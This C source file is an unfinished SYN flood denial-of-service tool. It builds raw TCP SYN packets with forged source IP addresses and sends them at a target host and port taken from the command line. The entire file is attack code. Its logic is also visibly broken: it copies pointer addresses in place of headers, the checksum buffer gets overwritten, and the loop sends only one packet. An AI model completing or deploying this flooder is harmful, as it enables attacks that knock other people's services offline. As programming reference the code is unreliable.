/**
 * SYN Flood
 * 
 * ** UNFINISHED **
 *
 * Author   : Ryannnnnnn (ryannx6@gmail.com)
 * Date     : 2014.11.10
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#include <unistd.h>
#include <pthread.h>

#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>

#define MAX_THRREAD 1

struct PSD_HEADER {
    unsigned long saddr;
    unsigned long daddr;
    char mbz;
    char ptcl;
    unsigned short tcpl;
};

struct Argument {
    const char *host;
    uint16_t port;
};

unsigned short checksum(char *buffer, int size)
{
    uint32_t cksum = 0;
    unsigned short *ptr = (unsigned short *) buffer;
    while (size > 1) {
        cksum += *ptr++;
        size -= sizeof (ushort);
    }
    if (size) cksum += *(unsigned char *) ptr;
    return (unsigned short)(~cksum);
}

void *_synflood_thread(void *arg)
{
    char target_host[20];
    uint32_t target_port;

    int sockfd, flag;
    struct sockaddr_in target_addr;

    int target_ip_net, target_ip_host;
    char send_buffer[256];
    struct ip *ip_header = (struct ip *) send_buffer;
    struct tcphdr *tcp_header = (struct tcphdr *) (send_buffer +
                                                   sizeof (struct ip));
    struct PSD_HEADER pseudo_header;
    int send_sequence;

    strcpy(target_host, ((struct Argument *) arg)->host);
    target_port = ((struct Argument *) arg)->port;
    if ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
        perror("socket() error");
        return NULL;
    }

    // Prepare fake ip host
    target_ip_net = inet_addr(target_host);
    target_ip_host = ntohl(target_ip_net);

    // Fill in `target_addr`
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = INADDR_ANY;
    target_addr.sin_addr.s_addr = target_ip_net;
    memset(&(target_addr.sin_zero), 0, 8);

    // Once the service is down, we should wait for the port to clear,
    // or just call setsockopt() to reuse the port
    flag = 1;
    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &flag, sizeof(int)) == -1)
    {
        perror("setsockopt(reuse addr) error");
        close(sockfd);
        return NULL;
    }

    // IP header included
    flag = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &flag, sizeof(int)) == -1)
    {
        perror("setsockopt(ip including) error");
        close(sockfd);
        return NULL;
    }

    // Set timeout
    struct timeval timeout;
    timeout.tv_sec = 10;
    timeout.tv_usec = 0;
    if (setsockopt(sockfd, SOL_SOCKET, SO_SNDTIMEO, (char *) &timeout,
                   sizeof (timeout)) == -1)
    {
        perror("setsockopt(send timeout) error");
        close(sockfd);
        return NULL;
    }

    // Preparation
    send_sequence = 0;

    // Fill in IP header
    ip_header->ip_hl = sizeof (struct ip) / sizeof(uint32_t);
    ip_header->ip_v = 0x04;
    ip_header->ip_tos = 0;
    ip_header->ip_len = htons(sizeof (struct ip) + sizeof (struct tcphdr));
    ip_header->ip_id = 1;
    ip_header->ip_off = 0;
    ip_header->ip_ttl = 128;
    ip_header->ip_p = IPPROTO_TCP;
    ip_header->ip_sum = 0; // TODO: fill it!
    ip_header->ip_src.s_addr = 0; // TODO: fill it!
    ip_header->ip_dst.s_addr = target_ip_net;

    // Fill in TCP header
    tcp_header->th_sport = 0; // TODO: fill it!
    tcp_header->th_dport = htons(target_port);
    tcp_header->th_seq = 0; // TODO: fill it!
    tcp_header->th_ack = 0;
    tcp_header->th_x2 = 0;
    tcp_header->th_off = sizeof (struct tcphdr) / 4;
    tcp_header->th_flags = TH_SYN;
    tcp_header->th_win = htons(16384);
    tcp_header->th_sum = 0; // TODO: fill it!
    tcp_header->th_urp = 0;

    pseudo_header.saddr = 0; // TODO: fill it!
    pseudo_header.daddr = ip_header->ip_dst.s_addr;
    pseudo_header.mbz = 0;
    pseudo_header.ptcl = IPPROTO_TCP;
    pseudo_header.tcpl = htons(sizeof (struct tcphdr));

#define SEQ 0x28376839
    int count = 0;
    while (1)
    {
        printf("thread %d, packet no.%d\n", 0, ++count);
        send_sequence = (send_sequence == 65536) ? 1 : send_sequence + 1;

        // fill in blank fields
        ip_header->ip_sum = 0;
        ip_header->ip_src.s_addr = htonl(target_ip_host + send_sequence);

        tcp_header->th_seq = htonl(SEQ + send_sequence);
        tcp_header->th_sport = htons(send_sequence);
        tcp_header->th_sum = 0;

        pseudo_header.saddr = ip_header->ip_src.s_addr;

        // Calculate checksums
        memcpy(send_buffer, &pseudo_header, sizeof (struct PSD_HEADER));
        memcpy(send_buffer + sizeof (struct PSD_HEADER), &tcp_header,
               sizeof (struct tcphdr));
        tcp_header->th_sum = checksum(send_buffer, sizeof (struct PSD_HEADER) +
                                     sizeof (struct tcphdr));

        memcpy(send_buffer, &ip_header, sizeof (struct ip));
        memcpy(send_buffer + sizeof (struct ip), &tcp_header,
               sizeof (struct tcphdr));
        ip_header->ip_sum = checksum(send_buffer, sizeof (struct ip) +
                                   sizeof (struct tcphdr));
        memcpy(send_buffer, &ip_header, sizeof (struct ip));

        int bytes = sendto(sockfd, send_buffer, sizeof (struct ip) +
               sizeof (struct tcphdr), 0, (struct sockaddr *) &target_addr,
               sizeof (struct sockaddr));
        printf("bytes = %d\n", bytes);
        break;
    }

    return NULL;
}

char host[20];
uint16_t port;

int synflood(const char *host, uint16_t port)
{
    int err;
    pthread_t tid;
    int thread_num = 0;
    while (thread_num < MAX_THRREAD)
    {
        struct Argument arg;
        arg.host = host;
        arg.port = port;
        if ((err = pthread_create(&tid, NULL, &_synflood_thread, &arg)) == 0)
        {
            thread_num ++;
            usleep(50);
        } else
        {
            perror("pthread_create() error");
        }
    }
    while (1); // Loop forever

    return 0;
}

int main(int argc, char *argv[])
{
    if (argc < 3) {
        perror("Invalid argument number");
        return -1;
    }

    strcpy(host, argv[1]);
    port = atoi(argv[2]);
    
    synflood(host, port);

    return 0;
}
